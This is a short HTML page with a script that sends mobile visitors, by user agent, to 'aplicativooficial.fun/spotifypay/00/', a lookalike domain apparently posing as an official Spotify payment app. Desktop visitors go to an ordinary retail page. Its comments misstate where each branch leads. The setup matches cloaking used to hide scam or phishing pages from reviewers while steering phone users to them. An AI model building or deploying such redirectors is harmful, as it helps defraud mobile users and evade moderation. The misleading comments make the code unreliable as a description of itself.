<!DOCTYPE html>
<html>
<head>
    <title>Redirecionamento de Dispositivos Móveis</title>
</head>
<body>
    <script type="text/javascript">
        // Verifica se é um dispositivo móvel
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            window.location.href = "https://aplicativooficial.fun/spotifypay/00/"; // Redireciona para a Apple
        } else {
            window.location.href = "https://www.livup.com.br/uva"; // Redireciona para o YouTube (ou qualquer outro site de sua escolha)
        }
    </script>
</body>
</html>
